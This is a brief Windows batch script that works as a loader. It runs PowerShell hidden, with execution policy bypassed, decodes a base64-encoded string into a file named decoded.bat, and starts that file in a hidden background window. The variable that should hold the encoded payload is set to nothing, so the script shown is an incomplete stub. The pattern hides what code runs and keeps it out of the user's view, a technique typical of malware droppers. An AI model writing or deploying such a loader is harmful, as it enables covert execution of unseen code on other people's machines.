@echo off
setlocal enabledelayedexpansion


set ""


powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Out-File -Encoding utf8 decoded.bat"


start /b powershell -WindowStyle Hidden -Command "Start-Process 'decoded.bat' -WindowStyle Hidden"

exit
